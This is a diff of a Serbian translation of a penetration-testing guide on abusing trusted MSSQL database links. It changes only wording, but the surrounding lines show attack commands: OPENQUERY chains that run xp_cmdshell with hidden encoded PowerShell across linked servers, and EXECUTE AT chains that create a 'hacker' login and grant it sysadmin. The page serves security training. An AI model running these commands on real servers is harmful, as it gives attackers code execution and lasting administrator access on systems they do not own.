@@ -7,7 +7,7 @@
 
 ### Python
 
-Alat [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se zasniva na impacket-u, i takođe omogućava autentifikaciju koristeći kerberos karte, i napad kroz link lance.
+Alat [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se zasniva na impacket-u, i takođe omogućava autentifikaciju koristeći kerberos karte, i napad kroz link lance
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -90,7 +90,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-Powershell modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma koristan u ovom slučaju.
+Modul powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma koristan u ovom slučaju.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ````
@@ -162,7 +162,7 @@ Ako je MSSQL instanca pouzdana (povezana baza) od strane druge MSSQL instance. A
 
 **Povezane baze funkcionišu čak i preko šuma poverenja.**
 
-### Zloupotreba Powershell-a
+### Zloupotreba Powershell
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -206,9 +206,9 @@ Napomena da će metasploit pokušati da zloupotrebi samo `openquery()` funkciju 
 
 ### Ručno - Openquery()
 
-Sa **Linux-a** možete dobiti MSSQL konzolu sa **sqsh** i **mssqlclient.py.**
+Sa **Linux**-a možete dobiti MSSQL konzolu sa **sqsh** i **mssqlclient.py.**
 
-Sa **Windows-a** takođe možete pronaći linkove i izvršiti komande ručno koristeći **MSSQL klijent kao** [**HeidiSQL**](https://www.heidisql.com)
+Sa **Windows**-a takođe možete pronaći linkove i izvršiti komande ručno koristeći **MSSQL klijent kao** [**HeidiSQL**](https://www.heidisql.com)
 
 _Prijavite se koristeći Windows autentifikaciju:_
 
@@ -232,7 +232,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 
 ![](<../../images/image (643).png>)
 
-Možete ručno nastaviti ovu vezu pouzdanih linkova zauvek.
+Možete ručno nastaviti ovu lanac pouzdanih linkova zauvek.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -240,7 +240,7 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Ako ne možete izvršiti akcije poput `exec xp_cmdshell` iz `openquery()`, pokušajte sa `EXECUTE` metodom.
+Ako ne možete izvršiti akcije poput `exec xp_cmdshell` iz `openquery()`, pokušajte sa metodom `EXECUTE`.
 
 ### Ručno - EXECUTE
 
@@ -250,7 +250,7 @@ Takođe možete zloupotrebiti poverljive linkove koristeći `EXECUTE`:
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Lokalna Eskalacija Privilegija
+## Lokalno Povećanje Privilegija
 
 **MSSQL lokalni korisnik** obično ima posebnu vrstu privilegije nazvanu **`SeImpersonatePrivilege`**. Ovo omogućava nalogu da "imituje klijenta nakon autentifikacije".
 
